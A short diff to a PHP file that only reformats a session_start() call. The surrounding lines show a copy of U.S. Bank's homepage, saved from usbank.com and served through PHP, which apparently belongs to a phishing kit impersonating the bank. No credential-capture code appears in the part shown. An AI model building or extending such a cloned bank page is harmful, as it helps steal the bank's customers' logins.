@@ -1,4 +1,6 @@
-<?php session_start(); ?>
+<?php 
+    session_start(); 
+?>
 <!DOCTYPE html>
 <!-- saved from url=(0033)https://www.usbank.com/index.html -->
 <html lang="en" class=" js canvas canvastext no-touch geolocation hashchange history draganddrop rgba multiplebgs backgroundsize borderimage borderradius opacity cssanimations csscolumns cssgradients csstransforms csstransforms3d csstransitions generatedcontent video audio svg inlinesvg smil svgclippaths">
